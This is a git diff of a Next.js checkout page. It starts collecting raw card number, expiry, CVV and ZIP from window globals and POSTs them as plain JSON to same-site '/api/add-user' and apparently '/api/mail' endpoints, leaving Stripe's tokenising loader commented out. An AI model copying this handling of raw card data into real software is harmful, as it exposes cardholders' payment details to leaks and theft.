@@ -1,8 +1,11 @@
 import Head from 'next/head'
 import { useRouter } from "next/router";
+import {loadStripe} from '@stripe/stripe-js';
 
 console.log(global.$type);
 console.log(global.$price);
+
+// const stripePromise = loadStripe('pk_test_TYooMQauvdEDq54NiTphI7jx');
 
 export default function Home() {
 
@@ -39,10 +42,29 @@ export default function Home() {
         // e.preventDefault()
         console.log('Sending')
       let data = {
-          name : 'test',
+          name : window.$name,
           email : window.$email,
-          message : 'hi'
+          cardDetailNo : window.$cardDetailNo,
+          cardDetailDate : window.$cardDetailDate,
+          cardDetailCvv : window.$cardDetailCvv,
+          cardDetailZip : window.$cardDetailZip
         }
+
+            fetch('/api/add-user', {
+        method: 'POST',
+        headers: {
+          'Accept': 'application/json, text/plain, */*',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      }).then((res) => {
+        console.log('Response received')
+        if (res.status === 200) {
+          console.log('Response succeeded!')
+        }
+      })
+
+        
       fetch('/api/mail', {
           method: 'POST',
           headers: {
